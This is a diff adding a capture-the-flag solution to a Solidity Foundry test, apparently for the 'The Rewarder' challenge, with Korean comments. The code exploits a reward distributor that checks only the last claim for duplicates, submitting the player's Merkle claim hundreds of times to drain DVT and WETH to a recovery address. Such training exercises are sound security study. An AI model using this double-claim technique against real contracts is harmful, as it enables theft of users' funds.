@@ -148,7 +148,46 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+
+        // 기본 전제: 플레이어한테도 DVT, WETH 토큰이 주어짐
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        uint256 PLAYER_INDEX = 188; // json파일에서 플레이어 정보 위치
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
         
+        // 돌파구: setClaimed 검증 로직이 이상함. 의도한건지는 모르겠는데 매 보상청구마다 검증을 안하고 마지막 보상청구만 중복인지 검증함.
+        // => 보상 중복수령 가능
+
+        Claim[] memory dvtClaims = new Claim[](867);
+        for (uint256 i = 0; i < dvtClaims.length; i++) {
+            dvtClaims[i] = Claim({ 
+                batchNumber: 0,
+                amount: PLAYER_DVT_CLAIM_AMOUNT,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, PLAYER_INDEX)
+            });
+        }
+        distributor.claimRewards({inputClaims: dvtClaims, inputTokens: tokensToClaim});
+
+        Claim[] memory wethClaims = new Claim[](853);
+        for (uint256 i = 0; i < wethClaims.length; i++) {
+            wethClaims[i] = Claim({ 
+                batchNumber: 0,
+                amount: PLAYER_WETH_CLAIM_AMOUNT,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, PLAYER_INDEX)
+            });
+        }
+        distributor.claimRewards({inputClaims: wethClaims, inputTokens: tokensToClaim});
+        
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
